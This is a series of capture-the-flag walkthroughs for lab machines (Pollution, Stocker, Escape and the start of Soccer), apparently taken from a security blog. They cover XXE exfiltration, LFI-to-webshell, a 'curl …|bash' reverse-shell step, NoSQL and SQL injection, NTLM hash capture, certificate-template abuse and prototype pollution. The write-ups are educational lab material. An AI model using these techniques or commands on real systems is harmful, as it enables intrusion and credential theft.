The next line creates a parameter named eval, which has a dynamic definition of another entity, exfil.  It then calls %eval to load it, thus loading exfil. Then it invokes %exfil, which causes the server to try to fetch that web resource. This will fail, but I’ll still get the request with the encoded data.
When I send the request again, there’s a request for xxe.dtd, and then the exfil:
That has the hostname:
Knowing from enumeration that the server is Apache, I should expect to find the config files for each site in /etc/apache2/sites-enabled/. default.conf and 000-default.conf are some default names to check for, but they both come up empty. It’s common to name the config files after the site names. Fetching collect.htb.conf works:
The config itself (with the default comments snipped) is unremarkable:
I’ll fetch the forum.collect.htb.conf config, and there’s not much interesting in here either:
It does give the full path to the web root.
Updating the DTD file one more time to get the developers.collect.htb.conf file, this one has a bit more:
In addition to defining the server name and the document root, it defines the restriction that requires creds to get to the site. The credentials are stored in /var/www/developers/public/.htpasswd.
I’ll fetch that file:
It decodes to a username and hash:
I’ll feed that hash to hashcat and it detects the hash type, and cracks it very quickly:
Now visiting the site with that username / password grants access.
With creds, the site is now just a login form:
It seems that the first password is to allow only the developers group access, but each person still needs their own auth.
My creds from the first site don’t work, popping a message box and then redirecting back to the login form:
None of the other passwords I’ve collected so far work with some basic guessing of names.
I’ll exfil the source code for index.php from the developers directory:
It checks at the top for auth in my current session. There’s also a pretty clear local file include (LFI) if I can get authenticated, as $_GET['page'] . ".php" is included without filtering.
At the top, it loads bootstrap.php with the require directive. This file defines the session storage as Redis:
It also has the creds!
Now I can connect to Redis with the password and access the session cookies it is holding:
My cookie in Firefox for developers.collect.htb is 7irvg47mvbp0lumhheo3auijsr, which is the third one. These sessions are flushed frequently, but I can get them back into Redis by logging into the main site or failing to login on the dev site.
I can view the data for that key and it’s empty:
None of the other keys have data either, except the one associated with my session on the main site:
That’s serialized PHP data, which looks like:
I know that PHP is looking for an array value named auth and failing if it is not set or not True:
I can get very similar looking serialized data in a PHP terminal:
Because the check if $_SESSION['auth'] != True with only one =, the types don’t have to match, so I can use a string with any non-empty value:
Alternatively, I can make a boolean value. In PHP:
There’s no length, just the type of b and the value of 1 for True. So in Redis I can:
With either of these set with my cookie, visiting developers.collect.htb redirects to /?page=home which loads:
The site doesn’t have anything interesting on it.
I already noted the LFI vulnerability is here:
It is taking user input and passing that to include. I can use this to read files across the file system, but only if they end in .php. This exploit gives me access to the source for the site (using PHP filters), but nothing I couldn’t already access with the XXE.
When Pollution was released, the PHP filter injection technique was not at all well known. Many in the community learned of it by playing Pollution. Since then, I’ve shown it as an unintended for UpDown and the intended path for Encoding. The UpDown post has a lot of detail, and this video goes into detail explaining it:
The short version is that I will stack filters in such a way that they generate bits of data, and with enough, can actually write the page I want to get included, which will be a simple webshell. It’s a super creative and cool technique.
I’ll use the script from Synacktiv to generate a payload. I can start with a simple echo to make sure it’s working:
I’ll paste that output in replacing “home” in the URL in Firefox, and it works:
I’ll generate a new payload to return a bash reverse shell:
Unfortunately, on submitting that, it fails:
Still, I’ll pick a shorter payload, one that just creates a webshell:
I’ll need to add 0=id to the URL GET parameters and it will execute id:
I’ll replace id with curl 10.10.14.6/s|bash:
It hits my server:
I’ll create s in my web directory:
And refresh Firefox. It gets s and then there’s a reverse shell at my nc listener:
I’ll use the script / stty trick to upgrade my shell:

Category: Shell as victor
There’s only one user with a directory in /home:
All three sites connect o MySQL using the credentials webapp_user / Str0ngP4ssw0rdB*12@1:
I’ll take a look through these DBs, but there’s not much of interest. Both webapp and developers have a users table with an admin user with the hash c89efc49ddc58ee4781b02becc788d14. I can tell from my own hash in that table that these are unsalted MD5 hashes. But this hash doesn’t crack to anything.
There are seven other users in the mybb_users table in forum. It’s using some kind of salted MD5.
I’ll go down a bit of a rabbit hole to figure out that these hashes are of the form md5(md5([salt]).md5([password])). This is actually mode 2811 in Hashcat, but none of these crack (creating a user with password “password”, dumping the hash and salt, and running that through hashcat verifies this works).
There is one other DB of interest, pollution_api:
It has two tables. messages is empty, and users has only the user I created by the admin on the webpage while doing XXE:
Looking at the process list, there are only two processes running as victor:
There’s a master fpm process that gives the config location:
That files shows two configurations, one as victor and one as www-data:
The victor one is listening on port 9000.
FPM is the FastCGI Process Manager. FastCGI is a protocol implementation like CGI (Common Gateway Interface), designed to connect web requests to executables / scripts.
It isn’t clear what legit purpose victor has for running fpm. I don’t see a scripts directory or anything available on 9000.
HackTricks has a nice page on Pentesting FastCGI. It gives the following script, as well as a link to this Python script:
I’ll copy the shell script to Pollution as /dev/shm/ex.sh. I need to change the FILENAMES variable to something that exists. I’ll use /var/www/developers/index.php. I’ll also change whoami to id because I think the output is more obvious.
With no other changes, I’ll run it:
It returns the output of id as victor!
I’ll update the script to always go for localhost, and use the first argument as the command to run:
I’ll have to change the speechmarks around a bit to allow for $1 to be processed as a variable. I’ll also add a trailing newline in the output. It works, reading victor’s home directory:
Given the access to victor, I’ll write my SSH public key into ~/.ssh/authorized_keys. The file doesn’t exist right now, so I don’t have to worry about overwriting anything:
I’ll write my key, and it seems to work:
With my public key in authorized_keys, I can connect over SSH:
And fetch user.txt:

Category: Shell as root
In victor’s home directory there is a folder named pollution_api:
It contains a NodeJS application:
index.js shows it uses the Express framework, and is listening on port 3000:
It has a default message for / which talks about /documentation, and it imports routes from four other directories.
The application is running:
In fact, it’s running as root:
I’ll also reconnect my SSH session with -L 3000:localhost:3000 so that 3000 on my VM now accesses this new API:
To analyze it more easily, I’ll exfil the source to my VM. I’ll create an archive on Pollution:
From my VM, I’ll copy it back with scp:
I’ll decompress it and the files are there:
Opening the directory in VSCode, the Synk plugin identifies 43 issues in the code, as well as 16 vulnerabilities in imported libraries and their version (in the “Open Source Security” section):
I’m particularly interested in the Command Injection (because that’s code execution) and Prototype Pollution (because it matches the box name) vulnerabilities. The command injection vulnerability is in the template call, where as the different prototype pollution vulns call out functions like defaultsDeep, zipObjectDeep, setWith, set, merge, and mergeWidth. I’ll keep an eye out for all of those in this code.
I’ll want to triage the Code Security vulnerabilities as well, but I should understand the code first.
I noted above that four .js files from routes were used as routes in index.js. documentation.js has a single endpoint, / (which is in the /documentation route, so really /documentation/) that returns the various endpoints on the API.
Requesting /documentation or reading the source shows static JSON describing the other routes on the API:
* The documentation says this is a GET, but in the source it’s a POST.
These are only the documentated endpoints. There could be others (such as /documentation) that are not included in this response. In this case, on looking through the source, nothing else is unaccounted for.
/client has two functions. The first is a router.use, which is middlewear that runs on all routes in this section. It effectively checks that there is a JWT in the x-access-token header, and that the username and role in that token matches what’s in the database.
The second function is router.post for /, and it just returns a message saying it’s not implemented:
Nothing too interesting here.
There’s a POST to /auth/register that makes sure there the username and password are filled in, and then queries for any user with that username. If it’s not found, it creates the user and calls a shell script:
exec seems risky, but there’s nothing I control going into it. Looking at the script, it doesn’t seem vulnerable:
If I could mess with the path, I could hijack date, but I don’t see a way to do that.
The other endpoint is /auth/login, which after some error checking, queries if the username and password match, and if so, create a JWT and return it:
sigtoken is imported at the top:
In the functions/jwt.js file is the signing key as well as the functions:
I can generate and sign my own tokens. But I also already have DB access or can register, so nothing too fancy there.
The admin.js file has middleware that will decode the JWT, make sure the user exists and the role matches, and make sure role is “admin”, or else (not shown) throw an error:
It’s actually quite odd to be checking the role in the DB when it’s already in the token. This kind of check is redundant.
There is a /admin endpoint that just refers to /documentation. The two messages endpoints are referenced from another file:
messages and messages_send are imported at the top:
messages basically checks if there’s an id submitted, and if so, finds that message and returns it:
Otherwise, it finds all the messages and returns them:
messages_send uses the token to get the user for the data. Then it merges the request body into the message.
That merge call is from lodash (which is imported as _), and one of the functions identify by Snyk as having the prototype pollution. This is likely the point of attack (and why it’s useful to know what vulnerabilities I’m looking for before looking at the code).
If I try to register the 0xdf user, it actually complains because I registered it earlier while looking at the XXE:
I’ll login:
If I drop that token in JWT.io, it shows the role as “user”:
From my shell as victor, I’ll log into MySQL using the creds I found earlier:
There’s only me in the users table:
I’ll make myself an admin:
Now I’ll log in again:
And this token shows “admin”:
The idea in a prototype pollution attack is to attack the prototype for objects. When you create a new object, it inherits from the prototype, but also carries a reference to that prototype along with it as .__proto__. I abused this in 2022 Hackvent Day 13 to give my user admin access.
We have this messages object, which is of type object:
I can verify this in a browser console:
When it calls merge(message, req.body), if done unsafely, I can structure req.body such that it overwrites parts of message.__proto__, which will be the prototype definition for object.
Then when exec is called, part of what is needed is the options object, which is of the type object according to the docs:
So if I can pollute the object prototype to have a shell value of something else, then exec will run that.
One way to do this is to write a different executable to disk on Pollution and overwrite shell with the full path to that. Hacktricks offers a payload is a bit slicker, as it will use the argv0 value in the prototype as well to somehow run arbitrary Node (in ways I don’t 100% understand, but does work).
I’ll go into Burp repeater and make a request to localhost:3000 and build it up to interact with the API. My payload will look like this:
text is just the requested parameter. Then I’m also updating the prototype with the variables from the HackTricks post. I’ve modified the argv0 parameter to copy bash into /tmp and make it SetUID/SetGID for root.
When I send this, I reports “Ok”. And the file is there:
I’ll run it (with -p to avoid dropping privs) and get a shell as root:
I’ll grab the root flag:
I was curious to play around with the maximum return on files over the XXE vulnerability. The passwd file is bigger than the Apache configs:
I am curious to find out the line between 2394 and 2218. I’ll add some lines of junk to the bottom of the developers.collect.htb.conf file:
Some experimenting shows that when the file is 2218 bytes it does not work, but 2217 bytes does. Now it’s not the raw file coming back as I am exfiling it, but the base64 encoded version, which will be roughly 4/3 the size. 2995 works, but 2999 fails:
It’s not super important what the exact limit is. I suspect PHP is limited at 3000 and counting perhaps the GET  as part of it. The important part is to know this could happen, and plan around it.
One thing I could do also is use a deflate filter before base64-encoding, which would compress the text and give me much more exfil. On the other hand, then it would be more of a pain to decode.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 14 Jan 2023
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.096s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Ubuntu 20.04 focal.
The website redirects to stocker.htb.
Given the use of hostnames on the webserver, I’ll fuzz to see if any subdomains of stocker.htb return something different from the default using ffuf. I’ll using -mc all to accept all HTTP response codes and -ac to auto-filter responses that look like the default case.
It finds dev.stocker.htb. I’ll add both to my /etc/hosts file:
The site sells some kind of furnature or homegoods:
All of the links on the page are to other parts of the same page. There’s no much interesting here.
The HTTP response headers don’t give anything away:
I’m able to guess at name of the index page, and the site loads as /index.html, suggesting this might just be a static site.
Nothing in the site source looks interesting.
I’ll run feroxbuster against the site:
The spider module that runs by default shows images / CSS / fonts, but nothing else of interest.
dev.stocker.htb redirects to /login which returns a login page:
Entering some guess creds shows the error message, which seems likely to be the same for invalid user and invalid password:
The HTTP response headers show that this site is running on Express, a NodeJS framework:
The 404 page is the default Express 404 as well:
feroxbuster on this site also returns nothing very interesting:
/stock is a page, but it just returns a redirect to /login, presumably needing a session to access it.

Category: Shell as angoose
It’s always worth looking for authentication bypasses by SQL injection. Putting a ' or " in the username or password doesn’t seem to change the response from the host. Express applications also tend to use NoSQL solutions like MongoDB, so I’ll want to check for those injections as well.
I’ll send the request over to Burp Repeater. First I’ll want to convert the request to JSON by changing the Content-Type header from application/x-www-form-urlencoded to application/json and changing the payload into JSON:
The response looks the same as the natural submit, so it seems to work ok in this format.
To check for a NoSQL injection auth bypass, I’ll first picture what the query on the server might look like. In fact, I’ll ask ChatGPT to imagine one for me:
This code is kind of vulnerable to NoSQL injection, in that if I pass a username of {"$ne": "0xdf"}, then it will find a user who’s usernane is not “0xdf”.
But then it will fail because the user’s password hash will almost certainly not match the password I submitted, and there’s no injection opportunity there.
What is the database is using plaintext passwords? A vulnerable query might look like:
To bypass the above query, I’ll submit the following JSON:
That would make the query:
So as long as there’s at least one user with a username that isn’t 0xdf and a password that isn’t “0xdf”, that user will be returned and I’ll log in. It works:
It seems I have a session cookie before the login attempt, and no new cookie is set, so the successful auth must be associated with that same cookie. I’ll visit dev.stocker.htb/stock in Firefox (where that cookie originated and is still present) and it works:
The site is a store, with four items. I can add them to the cart, and clicking “View Cart” pops a window that show the items:
If I click “Purchase”, a new window pops up:
The link to the purchase order provides a PDF:
I’ll download the PDF and take a closer look with exiftool:
The metadata field “Producer” has “Skia/PDF m108” and the “Creator” of “Chromium”.
On visiting /stocks, there’s a background request to /api/products that returns JSON with information about the products on the site:
Interestingly, adding an item to my cart doesn’t send any requests. It must be saving that locally. In fact, if I refresh the page, the cart goes back to empty, so it’s not even stored in local storage, but rather just in the running client-side JavaScript.
Clicking “Submit Purchase” is what sends a POST request to /api/order:
It includes the items to purchase.
It’s often useful to try to crash a site like this and look at the error messages. I’ll copy the /api/order request to Repeater and remove one of the values. It crashes:
The application is running out of /var/www/dev.
Searching for “skia/pdf m108 exploit”, the second result is a link to this HackTricks article about “Server Side XSS (Dynamic PDF)”.
If a web page is creating a PDF using user controlled input, you can try to trick the bot that is creating the PDF into executing arbitrary JS code. So, if the PDF creator bot finds some kind of HTML tags, it is going to interpret them, and you can abuse this behaviour to cause a Server XSS.
There’s a POC payload in that article that just tries to write “test”:
If this works, that shows that I can run JavaScript.
The easiest field to inject into looks like the “title” field. I’ll send the POST request to Repeater, and put this payload in the title field, as that’s one that is displayed back in the PDF:
The site reports success. Visiting the url for that purchase order (/api/po/[id]) shows it worked:
“test” overwrote all the other HTML / CSS that was making the PDF.
In the Read local file section, there are POCs to try. The first one involves a script using an XMLHttpRequest to read a file:
I’ll remove the newlines and escape the double quotes, place it as the title, and it works, kind of:
Only the start of /etc/passwd makes it into the page before it’s truncated:
It’s possible that there’s a way to pull a more complete string out of the PDF, but I’ll look at the other POCs, like this one that loads the file in an iframe:
Still kind of the same issue. There are a couple that use attachments, but I couldn’t get them to work.
The fix here is either to set the iframe size, or use a request and don’t base64 the data so that it will line wrap. I’ll go with the latter.
I’ll remove the boa from the previous payload:
After escaping the " and removing newlines, I get:
This returns something much better:
That’s nice, but there’s no newlines. Another technique that works nicely is to write an iframe into the page using the img tag I used at the start to test writing. I like this better than just inserting an iframe as it gets more space:
I’ll fetch the source using the same technique. I know it’s running from /var/www/dev. The main file is likely index.js, so I’ll start there:
This code does go more than a page, so I would have to switch back to the “just print the text without newlines” version if I want the full thing. Fortunately, for me, this is all I need.
At the top of the page, there’s a connection string to the MongoDB instance that has the password “IHeardPassphrasesArePrettySecure”.
With that password, I should try logging in. It doesn’t work for a dev user, and in checking /etc/passwd, there isn’t a dev user. The only target user is angoose. That works:
And I can grab user.txt:

Category: Shell as root
The angoose user can run node with scripts from a given directory as root:
That directory has five scripts in it:
Trying to run one as angoose fails:
This user doesn’t have permissions to connect to the DB. Running as root prints a nice table:
The issue here is that while the admin clearly wanted to only allow angoose to run scripts from that directory, * will match on ../ as well, so I can run any JS on the filesystem.
I’ll write a short JavaScript file that will create a copy of bash, set it to owned by root, and make it SetUID to run as root:
Now I run that with sudo:
/tmp/0xdf is there, owned by root, and has the s in the owner execute field.
I’ll run it with -p to keep privs, and get a shell as root:
And the root flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 25 Feb 2023
OS : Windows
Base Points : Medium [30]
Nmap scan:
Host is up (0.092s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49668/tcp open  unknown
49691/tcp open  unknown
49692/tcp open  unknown
49708/tcp open  unknown
49712/tcp open  unknown
63474/tcp open  unknownCategory: Recon
nmap finds a bunch of open TCP ports:
This looks very much like a Windows domain controller, based on standard Windows stuff like SMB (445), NetBIOS (135/139), LDAP (389, etc), and WinRM (5985), as well as 53 (DNS) and 88 (Kerberos) typically seen listening on DCs. There’s also a MSSQL server (1433).
The nmap scripts running on LDAP show the domain name of sequel.htb, and the TLS certificate is for dc.sequel.htb. I’ll add each of these, along with the hostname dc (Windows likes that sometimes) to my /etc/hosts file:
Finally, I note that the clock on this server is 8 hours off from my clock. I’ll need to sync this to do any Kerberos stuff.
I’ll dive a bit deeper on the TLS certificates in use, using openssl to pull and format it:
It’s interesting to note the certificate authority that issued the certificate, sequel-DC-CA.
I’ll poke at the SMB shares with crackmapexec. Without a username and password, it fails:
But, if I give it any username and an empty password, it works:
The only interesting share I can access is Public. I’ll connect, using -N for null password:
There’s a single PDF file. I’ll download it:
The document is a little over a page with information about connecting to MSSQL:
The important part is the last paragraph, which says:
For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user PublicUser and password GuestUserCantWrite1 .
Refer to the previous guidelines and make sure to switch the “Windows Authentication” to “SQL Server Authentication”.
That username / password does not work to connect over WinRM.
With the creds, I can connect to the MSSQL server. I’ll use the Impacket tool mssqlclient.py:
There are four databases on this server:
These are the four default databases on MSSQL.
There’s a bunch more enumeration I could do at this point:
Given the hints so far (the domain name, the fact that the document is talking about MSSQL), I’m going to go that direction and come back to enumeration if need be.

Category: Shell as sql_svc
The first thing I’ll try is running commands through MSSQL server using the xp_cmdshell stored procedure. Unfortunately for me, it fails:
I can try to enabled it (as I showed here in Scrambled’s Alternative Roots), but this account doesn’t have permission:
There’s no interesting data in the database and I can’t run commands. The next thing to try is to get the SQL server to connect back to my host and authenticate, and capture a challenge / response that I can try to brute force. I showed this for Querier as well as in my Getting Creds via NTLMv2 post.
I’ll start Responder here as root listening on a bunch of services for the tun0 interface:
The only one I really care about here is SMB.
Now I’ll tell MSSQL to read a file on a share on my host:
It returns nothing, but at Responder there’s a “hash”:
I’ll use hashcat to crack this. The autodetect mode will find the hash type of 5600:
It cracks the password to REGGIE1234ronnie in about 15 seconds on my machine.
With that credential, I can get a shell as sql_svc using Evil-WinRM:

Category: Shell as Ryan.Cooper
The sql_svc home directory is basically empty. Ryan.Cooper is the only other user on the host with a home directory:
In the root of the C drive, the Public and SQLServer folders are unusual:
Public just has the SQL Server PRocedures.pdf file.
SQLServer has that installation:
There’s a single file in the Logs directory:
This file has logs from the SQL server:
Almost at the end of the log, there’s these messages:
It looks like Ryan.Cooper potentially mistyped their password, and the entered the password “NuclearMosquito3” as the username. This could happen if Ryan hit enter instead of tab while trying to log in.
I’ll try that username / password combination, and it works:
I’ll grab user.txt:

Category: Shell as administrator
One thing that always needs enumeration on a Windows domain is to look for Active Directory Certificate Services (ADCS). A quick way to check for this is using crackmapexec (and it works as either sql_svc or Ryan.Cooper):
It finds the same CA that I noticed above.
With ADCS running, the next question is if there are any templates in this ADCS that are insecurely configured. To enumerate further, I’ll upload a copy of Certify by downloading a copy from SharpCollection, and uploading it to Escape:
The README for Certify has walkthrough of how to enumerate and abuse certificate services. First it shows running Certify.exe find /vulnerable. By default, this looks across standard low privilege groups. I like to add /currentuser to instead look across the groups for the current user, but both are valuable depending on the scenario.
After printing some information about the Enterprise CA, it then lists a single vulnerable certificate template:
The danger here is that sequel\Domain Users has Enrollment Rights for the certificate (this is scenario 3 in the Certify README).
I can continue with the README scenario 3 by next running Certify.exe to request a certificate with an alternative name of administrator. It returns a cert.pem:
Both the README and the end of that output show the next step. I’ll copy everything from -----BEGIN RSA PRIVATE KEY----- to -----END CERTIFICATE----- into a file on my host and convert it to a .pfx using the command given, entering no password when prompted:
I’ll upload cert.pfx, as well as a copy of Rubeus (downloaded from SharpCollection), and then run the asktgt command, passing it the certificate to get a TGT as administrator:
It works! However, Rubeus tries to load the returned ticket directly into the current session, so in theory, once I run this I could just enter administrator’s folders and get the flag. However, this doesn’t work over Evil-WinRM.
Instead, I’m going to run the same command with /getcredentials /show /nowrap. This will do the same thing, and try to dump credential information about the account:
The last line is the NTLM hash for the administrator account.
An alternative tool to accomplish the same thing is Certipy, which is nice because I can run it remotely from my VM. It has a find command that will identify the vulnerable template:
And req allows me to get the .pfx certificate just like I did with Certify.exe and openssl above:
The auth command will take that certificate (administrator.pfx) and get the hash.
I noted above that there was an eight hour different in clock times. I can sync the clock with Escape using ntpdate:
This typically kills my VPN session with HTB, but after reconnecting, I’m able to dump the hash:
With the NTLM hash for administrator, I’ll connect over Evil-WinRM:
And grab the flag:
There’s a really interesting unintended path in Escape involving Silver Tickets. This path was detected in HTB testing, but the team and the box author decided to leave it in, as there is no good way to patch it in this scenario, and this path is assessed to be harder to spot and just as difficult as the intended path.
Silver Ticket are described really nicely in this adsecurity.org post.
Typically when I want to authenticate to MSSQL, I ask for a Kerberos ticket for the service principle name (SPN). That request goes to the key distribution center (KDC) (typically the domain controller), where it looks up the user associated with that SPN, checks if the requested user is supposed to have access, and after a couple rounds of communication, returns a ticket for the user, encrypting it with the NTLM hash of the service account. Now when the user gives that ticket to the service, the service can decrypt it and use it as authentication.
In a Silver Ticket attack, all the communication with the DC is skipped. The attacker forges the service ticket (also called a TGS), and encrypts it with the service account’s NTLM.
I have the NTLM hash of the sql_svc account. The MSSQL service doesn’t have an SPN assigned (if it did, I could ask the DC to generate a service ticket that would be encrypted with sql_svc’s hash and then modify it). Still, I don’t need the DC here. I can forge a service ticket locally using Impacket tools, encrypt it with that NTML hash of the sql_svc, and then connect to MSSQL. This ticket won’t work on any other service, but I’ll be able to impersonate any user on MSSQL.
To generate a Silver Ticket, I’ll use ticketer.py, which will need the following information:
I’ve already got the domain name of sequel.htb.
I’ve got the password for sql_svc, but I need the NTLM hash. There are a bunch of online tools that will calculate that for you. That works fine for HTB, but if this were a real engagement, I wouldn’t want to put customer data into an untrusted website.
I’ll do it in Python, using hashlib. NTLM is an MD4 has of the UTF-16 little ending encoding of the password:
To print that nicely I’ll use hex():
Get-ADDomain (docs) returns information about the domain, including the SID:
I’ll call ticketer.py with this information:
It calculates the necessary information and saves the TGS in administrator.ccache. I’ll use the KRB5CCNAME environment variable to tell my system to use that service ticket to authenticate. This can be done either by running export KRB5CCNAME=administrator.ccache or by including KRB5CCNAME=administrator.ccache before each command (which I’ll use to show where it’s used).
With that ticket, I can authenticate to MSSQL as administrator:
From this point, I can read files from the box as administrator:
xp_cmdshell is still disabled, but unlike sql_svc, the administrator user has permissions to enable it:
The commands are still running as sql_svc. That’s because sql_svc is still the process running the MSSQL service. It is just able to negotiate with the OS to read file as administrator because it has that ticket.
With file read and write as administrator, I can turn that into execution as administrator. This PayloadsAllTheThings page shows various methods. I showed the DiagHub method in HackBack, though it has since been patched. I showed the WerTrigger method in Proper, and I believe that one still works.
Or I can use the shell through MSSQL and abuse SeImpersonatePrivilege with a Potato exploit (as I’ve shown many times before).
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 17 Dec 2022
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.093s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9091/tcp open  xmltec-xmlmailCategory: Recon
nmap finds two open TCP ports, SSH (22), HTTP (80), and something HTTPish (9091):
Based on the OpenSSH version, the host is likely running Ubuntu 20.04 focal.
The port 80 HTTP server shows a redirect to soccer.htb.
Given the use of potential host based routing, I’ll try to brute force the webserver on port 80 to see if it replies differently for any subdomains of soccer.htb. It doesn’t find anything:
Because port 9091 looks like a webserver as well, I can try that, but it doesn’t find anything either:
I’ll add soccer.htb to my hosts file:
The site is for the HTB FootBall Club:
There are no links on the page.
The HTTP headers don’t show much beyond nginx:
The page loads as /index.html, suggesting it may just be a static site. The page source doesn’t show anything interesting either.
The 404 page is a standard nginx 404:
So there could be something else here, but it’s looking like a static site at this point.
I’ll run feroxbuster against the site:
It finds /tiny and /tiny/uploads.
/tiny is an instance of Tiny File Manager:
This is a common name for software, but searching for it with the term “CCP Programmers” finds the source on GitHub here, where it describes itself as:
TinyFileManager is web based PHP file manager and it is a simple, fast and small size in single-file PHP file that can be dropped into any folder on your server, multi-language ready web application for storing, uploading, editing and managing files and folders online via web browser. The Application runs on PHP 5.5+, It allows the creation of multiple users and each user can have its own directory and a built-in support for managing text files with cloud9 IDE and it supports syntax highlighting for over 150+ languages and over 35+ themes.

Category: Shell as www-data
On the README file, it gives the following instructions for how to set up Tiny File Manager:
Download ZIP with latest version from master branch.
Just copy the tinyfilemanager.php to your webspace - that’s all :) You can also change the file name from “tinyfilemanager.php” to something else, you know what i meant for.
Default username/password: admin/admin@123 and user/12345.
Warning: Please set your own username and password in $auth_users before use. password is encrypted with password_hash(). to generate new password hash here
To enable/disable authentication set $use_auth to true or false.
Add your own configuration file config.php in the same folder to use as additional configuration file.
To work offline without CDN resources, use offline branch
That gives two sets of default credentials, “admin” / “admin@123” and “user” / “12345”. Both sets of creds work here. I’ll log in as admin.
Logged in, the page show the files that are part of the Soccer website:
The URL is http://soccer.htb/tiny/tinyfilemanager.php?p=, which shows that the server is running PHP.
The tiny directory has the filemanager page, as well as the uploads directory:
uploads is empty:
I’ll make a simple PHP webshell:
I’ll use the “Upload” button, and it offers a way to upload:
If I try to upload in /var/www/html/, it fails:
If I navigate to /tiny/uploads and then click “Upload”, it works:
The webshell provides execution:
I’ll start nc listening on 443 on my host, and trigger a reverse shell by sending a bash reverse shell:
It hangs, but there’s a connection at nc:
I’ll upgrade my shell using the script / stty trick.

Category: Shell as player
The files in /var/www/html match what I observed via the file manager:
There’s no database connection. The only credentials in the files are the users created for the Tiny File Manager:
There’s one home directory in /home, player:
user.txt is in that directory but www-data can’t read it:
The netstat shows a few ports that weren’t available from the outside:
There’s still not much information about what 9091 could be. Port 3000 looks to be another web page:
3306 and 33060 both seem to be MySQL instances:
It’s hard to verify any of this as www-data can only read it’s own processes:
That is because /proc is mounted with hidepid=2:
There’s nothing else of interest in the system root or /opt or /srv. I’ll look at how nginx is configured. There are two site files in /etc/nginx/sites-enabled:
default set up the redirect to soccer.htb:
It also configures the main site, allowing it PHP for PHP files:
soc-player.htb sets up another site that matches on the name soc-player.soccer.htb:
This webserver is hosted out of /root/, which is interesting, and passes to localhost 3000 (as observed previously).
I’ll update my hosts file:
This site looks exactly the same as the previous, except it has more options in the menu bar:
“Match” has a page with a couple matches on it:
It mentions a free ticket with login. I’ll register an account on the login:
After logging in, it redirects to /check, where I get a ticket id:
I can put a ticket id into the field and hit enter, and it tells me that the ticket exists:
Or a different number does not exist:
The HTTP headers on this site show something different:
It’s running Express, a NodeJS web framework.
There’s another interesting request. Logging in submits a POST request to /login. On success, it returns a 302 redirect to /check. As that page is loading, it makes a request to soc-player.soccer.htb:9091, which returns a 101:
HTTP 101 is a Switching Protocols response:
TCP 9091 is a websocket server. There’s no immediate messages shown in the “WebSockets history” tab in Burp. But once I check a ticket, there’s a message and a response:
The sent message is simply JSON with the id:
The response is just the text that is shown:
I’ll send one of the “To server” message to Burp Repeater and play around with it. Adding in a ' doesn’t do anything other than return “Ticket Doesn’t Exist”. Any time I’m trying SQLI with an integer value, it’s worth trying without a ' as well. The ' is used to close strings, but if the input is being handled as an integer, perhaps just an ` or 1=1– - will work (where – -` is to comment out whatever follows). It does:
There is no ticket 0, but it still returns exists because it pulls all rows.
This is a blind SQL injection - no data from the database comes back in the response, only one of two responses. The goal is to be able to ask questions of the database. For example, “is there a username that starts with ‘a’”?
To get there, first I’ll need to be able to picture the query being run on the system. It’s going to be something like:
If one or more rows return, then it says the ticket exists, else it doesn’t.
To make a test, there are a few ways I could structure a query. For manual testing, I prefer to use a UNION injection. I’ll send something that will return no rows, and then use a UNION to make another query, and then if that query returns rows, it will return that the “Ticket Exists”.
It’s also possible to make these queries using OR foo=bar to test, but I find those more difficult to think about when doing the manual approach.
I’ll also note that the app seems to handle query errors by returning “Ticket Doesn’t Exist” rather than crashing.
I need to know the number of columns returned from the query, because my UNION statement must return the same number, or it crashes. If I send one, it returns false:
I’ll add more columns until it returns true at three columns:
Now the query on the server looks like this:
The first select returns no row, and then my UNION returns the values 1, 2, 3, and it returns “Ticket Exists”.
Now to ask a question. In MySQL, there’s a mysql.user table with the users that can log into MySQL. I’m going to send this payload that will return true if there’s a user in that table that starts with “a”:
It returns false. There is likely a user named “root”, and changing “a” to “r”, it returns true:
With enough requests, any value from the table can be brute-forced one character at a time.
Doing all of this manually is impossible, so I’ll either have to write a script to do it, or find a tool. sqlmap is the perfect tool here, and it even works over websockets.
If sqlmap returns this error, it’s because the Python websockets library is missing:
Or if sqlmap returns this error, it’s because the wrong websockets library is installed:
Either of these are fixed with pip install websocket-client.
I’ll give it the following arguments:
It finds a time-based injection, and then finds the three column UNION-based boolean as well:
It’s using the OR structure for boolean rather than UNION.
Now that sqlmap has found an injection, I’ll up-arrow and add --dbs to the previous command. Theads are safe to do in a boolean injection, so I’ll add --threads 10 to speed it up. It will pick up where it left off and list the available databases:
soccer_db seems like the only non-default DB. I’ll replace --dbs with -D soccer_db to specify that database and then add --tables to list the tables:
There’s only one.
In general, with boolean and time-based SQL injections, I want to be careful about dumping tons of data, as it will be very slow. That said, since there’s only one table, I want the entire thing, so I’ll replace --tables with -T accounts and add --dump. It dumps the table:
The user is player and the password is in plaintext.
That password works for the player user on the box with su:
It works for SSH as well:
Either way I’ll grab user.txt:

Category: Shell as root
The first check on Linux is always sudo, but nothing set up for player on Soccer:
However, in looking for SetUID binaries, the first one jumps out:
doas is an alternative to sudo typically found on OpenBSD operating systems, but that can be installed on Debian-base Linux OSes like Ubuntu.
I don’t see a doas.conf file in /etc, so I’ll search the filesystem for it with find:
It has one line:
player can run the command dstat as root.
dstat is a tool for getting system information. Looking at the man page, there’s a section on plugins that says:
While anyone can create their own dstat plugins (and contribute them) dstat ships with a number of plugins already that extend its capabilities greatly.
At the very bottom of the page, it has a section on files:
Paths that may contain external dstat_*.py plugins:
Plugins are Python scripts with the name dstat_[plugin name].py.
I’ll write a very simple plugin:
